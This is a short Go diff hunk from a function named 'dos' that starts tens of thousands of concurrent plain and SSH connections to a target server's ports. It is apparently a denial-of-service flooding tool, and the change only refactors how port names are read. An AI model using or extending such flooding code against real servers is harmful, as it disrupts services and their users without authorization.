@@ -68,10 +68,10 @@ func dos(data *structs.Data) bool {
 	var wg sync.WaitGroup
 	sshConfig := createConfig(data.User, data.Pass)
 	for i := 0; i < 30000; i++ {
-		for port, specs := range data.Ports {
+		for port, name := range data.Ports {
 			wg.Add(1)
 			server := net.JoinHostPort(data.Server, port)
-			if specs["name"] == "ssh" {
+			if name == "ssh" {
 				go sshConnect(server, sshConfig, &wg)
 			} else {
 				go connect(server, &wg)
